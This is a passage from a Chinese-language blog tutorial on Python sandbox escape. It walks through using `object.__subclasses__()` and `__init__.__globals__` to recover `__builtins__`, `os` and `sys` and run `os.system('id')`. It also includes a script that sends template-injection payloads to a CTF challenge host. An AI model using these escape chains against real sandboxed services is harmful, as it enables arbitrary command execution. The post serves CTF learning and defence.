+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = <span class="keyword">lambda</span>:<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__==foo.__globals__==<span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <ul>
+<li><p><code>__globals__</code> 是绑定在函数上的，<strong>无论函数在何处被调用，它的 <code>__globals__</code> 都不会变</strong>，始终指向定义它的模块。</p>
+</li>
+<li><p>某些内置函数（如 <code>len</code>、<code>os.system</code>）是 C 实现的，它们<strong>没有 <code>__globals__</code> 属性</strong>。</p>
+</li>
+</ul>
+
+    </div>
+  </div>
+
+<h3 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h3><p><code>__init__</code> 是类的“构造器方法”，在<strong>类实例化时自动调用</strong>，用于初始化实例的属性。</p>
+<p>对象的 <code>__init__</code> 方法分为<strong>“默认的”</strong>和<strong>“重载过的”</strong>两种情况：</p>
+<ul>
+<li><p>如果你 <strong>没有</strong>在类里定义 <code>__init__</code>，Python 会自动从其<strong>父类继承一个默认的 <code>__init__</code> 方法</strong>。这是 <strong>内置的 object 类</strong> 提供的默认 <code>__init__</code>，它是一个 C 实现的“slot wrapper”，不是真正的 Python 函数。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__init__</span><br><span class="line">&lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>如果你 <strong>定义了自己的 <code>__init__</code></strong> 方法，则你看到的就是一个标准的 Python 函数对象。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;init from B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.__init__)</span><br><span class="line"><span class="comment"># 输出 &lt;function B.__init__ at 0x...&gt;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>其中默认的 <code>__init__</code> 是 C 实现的 slot wrapper，没有 <code>__globals__</code> 属性；而只有<strong>Python 写的函数</strong>才有 <code>__globals__</code>，才能通过它来找到导入的模块。</p>
+<p>因此在沙箱逃逸中常常需要寻找一个拥有重载 <code>__init__</code> 的对象，然后通过 <code>obj.__init__.__globals__</code> 来获得该对象的所在模块的全局命名空间。在这个全局全局命名空间中，我们可以找回被沙箱删除掉的 <code>__builtins__</code>、<code>os</code> 等模块。</p>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>实际上在沙箱逃逸中，我们不一定要用 <code>__init__</code> 函数的 <code>__globals__</code> 属性来获取所在模块的全局命名空间，其他函数也是可以的。</p>
+<ul>
+<li><code>__del__</code>：一个类的析构函数，当一个对象被销毁时，它会被自动调用。</li>
+<li><code>__str__</code> &#x2F; <code>__repr__</code>：用于定义对象的字符串表示形式。<code>__str__</code> 在使用 <code>str()</code> 或 <code>print()</code> 时调用，<code>__repr__</code> 在使用 <code>repr()</code> 或交互式解释器时调用。如果未定义 <code>__str__</code>，则默认使用 <code>__repr__</code>。</li>
+<li><code>__eq__</code> &#x2F; <code>__ne__</code> &#x2F; <code>__lt__</code> &#x2F; <code>__gt__</code> &#x2F; <code>__le__</code> &#x2F; <code>__ge__</code>：定义对象之间的比较操作，如等于、不等于、小于、大于、小于等于、大于等于。</li>
+<li><code>__add__</code> &#x2F; <code>__sub__</code> &#x2F; <code>__mul__</code> &#x2F; <code>__div__</code> &#x2F; <code>__mod__</code> &#x2F; <code>__pow__</code>：定义基本数学运算符的行为，如加、减、乘、除、取模、幂运算等。</li>
+<li><code>__getitem__</code> &#x2F; <code>__setitem__</code> &#x2F; <code>__delitem__</code>：定义对象通过索引访问、赋值和删除的行为，支持类似列表、字典的操作。</li>
+<li><code>__iter__</code> &#x2F; <code>__next__</code>：定义对象的迭代行为，支持 <code>for</code> 循环或手动调用 <code>next()</code>。</li>
+<li><code>__call__</code>：允许实例像函数一样被调用，即支持 <code>obj()</code> 这样的语法。</li>
+<li><code>__getattr__</code> &#x2F; <code>__setattr__</code> &#x2F; <code>__delattr__</code>：用于拦截属性的访问、设置和删除操作，常用于自定义对象属性管理逻辑。</li>
+</ul>
+
+    </div>
+  </div>
+
+<h1 id="无-builtins-绕过"><a href="#无-builtins-绕过" class="headerlink" title="无 builtins 绕过"></a>无 builtins 绕过</h1><h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>在某些 <strong>Python 沙箱执行环境</strong>中，为了防止用户执行危险操作，会通过下面的方式清空 <code>__builtins__</code>：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;...&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>这样做的效果是：</p>
+<ul>
+<li>阻止了访问 <code>print</code>, <code>eval</code>, <code>open</code>, <code>__import__</code>, <code>object</code> 等内置函数&#x2F;类；</li>
+<li>即使写了 <code>&quot;__import__(&#39;os&#39;)&quot;</code>，也会报错：因为你访问不到 <code>__import__</code> 函数了。</li>
+</ul>
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>在 Python 中，<code>eval(expr, globals=None, locals=None)</code>（以及 <code>exec</code>）的参数解析规则是这样的：</p>
+<ul>
+<li><p>如果你显式传入了 <code>globals</code> 参数，并且它是一个字典，但其中<strong>没有</strong>键 <code>__builtins__</code>，解释器会<strong>自动插入</strong>一份 <code>__builtins__</code>（通常是对内置模块 <code>builtins</code> 的引用）。</p>
+</li>
+<li><p>因此，仅仅将 <code>globals</code>&#x2F;<code>locals</code> 传入<strong>空字典</strong>，并不能抹掉内建函数和对象；它们会被自动补回。例如：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;&#125;)  <span class="comment"># ✅ 正常输出 2，因为自动补回了 builtins</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>如果你想阻止访问内建对象，需要<strong>显式覆盖</strong> <code>__builtins__</code>，比如：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)   <span class="comment"># ❌ NameError: len</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;)  <span class="comment"># ❌ NameError: __import__</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>你也可以放一个<strong>白名单 dict</strong> 作为 <code>__builtins__</code>，只允许有限的内建函数：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;print(&#x27;ok&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;)  <span class="comment"># ✅ 只能用 print</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+
+    </div>
+  </div>
+
+<p>例如：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;python-input-0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure></div>
+
+<p>然而上述示例中<strong>清空的 <code>__builtins__</code> 是“执行环境”的，而不是函数定义时保存的环境</strong>。</p>
+<p>这是因为一个 Python 函数对象，在它<strong>定义的时候</strong>，解释器就会把它的定义环境（即它所在模块的 <code>globals()</code>）保存进 <code>func.__globals__</code> 里了。也就是说就算之后你手动删掉了 <code>globals()[&#39;__builtins__&#39;]</code>，这个引用也早就存着原来的内容了（指向 builtins 模块）。</p>
+<p>因此这种情况下需要通过某种方式找回 <code>__builtins__</code>，然后<strong>重新获得对内置函数（如 <code>__import__</code>, <code>open</code>, <code>eval</code>, <code>os.system</code>）的访问权</strong>，以便执行命令、读取文件等。</p>
+<h2 id="通过内省机制绕过"><a href="#通过内省机制绕过" class="headerlink" title="通过内省机制绕过"></a>通过内省机制绕过</h2><p>Python 是高度<strong>自反</strong>（Reflective）和<strong>动态</strong>的语言。即使你删掉了 <code>__builtins__</code>，程序运行过程中创建的对象、类、模块等都依然<strong>保存在内存中并可以被访问</strong>。我们可以通过<strong>类型系统和继承结构</strong>，去“翻”到这些对象。</p>
+<h3 id="获取-object-类"><a href="#获取-object-类" class="headerlink" title="获取 object 类"></a>获取 object 类</h3><p>Python 中所有对象的基类是 <code>object</code>，所以我们从任意对象出发，拿到 <code>object</code>：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="获取-object-的可用子类"><a href="#获取-object-的可用子类" class="headerlink" title="获取 object 的可用子类"></a>获取 object 的可用子类</h3><p>我们可以通过类的 <code>__subclasses__</code> 方法获取 <code>object</code> 的所有子类。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">object</span>.__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, ...]</span><br></pre></td></tr></table></figure></div>
+
+<p>这就是内存中现存的类对象。我们就可以在这些子类中寻找一个有没有重载过 <code>__init__</code> 的类，以便通过 <code>__init__.__globals__</code> 找到 <code>os</code> 或 <code>builtins</code> 模块。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="built_in">print</span> (i, <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure></div>
+
+<p>对于远程环境，我们可以通过循环发包请求来探测可用类在 <code>object.__subclasses__()</code> 中的下标：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用 SSL 验证警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://14fba753-0bb4-47e2-bc11-9341f5e11d10.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_index</span>(<span class="params">index</span>):</span><br><span class="line">    payload = quote(<span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[<span class="subst">&#123;index&#125;</span>].__init__&#125;&#125;&#125;&#125;&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/?name=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found subclass at index <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    --&gt; <span class="subst">&#123;resp.text.strip()[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error on index <span class="subst">&#123;index&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        probe_index(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="globals-中的可用模块"><a href="#globals-中的可用模块" class="headerlink" title="globals 中的可用模块"></a>globals 中的可用模块</h3><p>Python <strong>函数对象</strong>有 <code>__globals__</code> 属性，保存了函数定义所在模块的<strong>全局命名空间</strong>。内置模块（<code>builtins</code>）或导入的模块（如 <code>os</code>，<code>sys</code>）常常在里面。</p>
+<h4 id="builtins-模块-1"><a href="#builtins-模块-1" class="headerlink" title="builtins 模块"></a>builtins 模块</h4><p>例如 <code>warnings.catch_warnings</code> 模块的全局命名空间中有 <code>__builtins__</code> 模块，也就是说我们已经找回 <code>__builtins__</code> 模块，可以：</p>
+<ul>
+<li>使用该模块的 <code>__import__</code> 函数导入 <code>os</code> 模块来执行命令；</li>
+<li>或者通过该模块的 <code>eval</code> 函数直接执行 python 脚本。</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>这里通过 <code>__init__.__globals__</code> 找到的并不是真正的 <code>__builtins__</code> 模块，而是<strong>字典形式的 <code>builtins</code> 命名空间快照</strong>。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这就是为什么通过 <code>__init__.__globals__</code> 找到的“<code>__builtins__</code> 模块”可以直接通过字典的形式访问模块中的函数，而真正的 <code>__builtins__</code> 模块需要通过 <code>__dict__</code> 属性或者直接属性访问。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">eval</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+    </div>
+  </div>
+
+<h4 id="os-模块-1"><a href="#os-模块-1" class="headerlink" title="os 模块"></a>os 模块</h4><p>而 <code>os._wrap_close</code> 类本身位于系统模块中，因此可以直接通过该类所在模块的全局命名空间直接找到 <code>system</code> 函数执行命令。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="sys-模块"><a href="#sys-模块" class="headerlink" title="sys 模块"></a>sys 模块</h4><p><code>sys.modules</code> 是 Python 运行时的一个 <strong>全局字典</strong>，用来<strong>缓存所有已经导入的模块对象</strong>。它是 Python <strong>import 机制的核心缓存</strong>，所有模块导入都会经过它。</p>
+<blockquote>
+<p><code>sys.modules</code> 的作用是<strong>缓存已加载的模块</strong>。当你第一次 <code>import</code> 一个模块时，Python 会加载并执行该模块的代码，然后将模块对象保存到 <code>sys.modules</code> 中。以后再导入同名模块时，Python 会直接从 <code>sys.modules</code> 里取出已有的模块对象，而不会再次加载和执行模块代码。</p>
+</blockquote>
+<p><code>sys.modules</code> 是字典类型，其中：</p>
+<ul>
+<li><strong>键（key）</strong>：模块名（字符串，比如 <code>&#39;os&#39;</code>、<code>&#39;sys&#39;</code>）</li>
+<li><strong>值（value）</strong>：模块对象本身</li>
+</ul>
+<p>因此如果我们能够从全局空间中找到 <code>sys</code> 模块也就找到了 <code>modules</code> 全局字典，进而找到所有的模块。这里还是以 <code>warnings.catch_warnings</code> 为例：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Python 沙箱逃逸</li>
+        <li><strong>Author:</strong> sky123</li>
+        <li><strong>Created at
+                :</strong> 2025-08-12 00:01:08</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-12 00:01:06
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://skyi23.github.io/2025/08/12/Python 沙箱逃逸/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/python-web/">#python web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/08/12/Python%20%E5%B8%B8%E8%A7%81%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Python 常见框架安全</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/08/11/Pickle%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">Pickle 反序列化</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
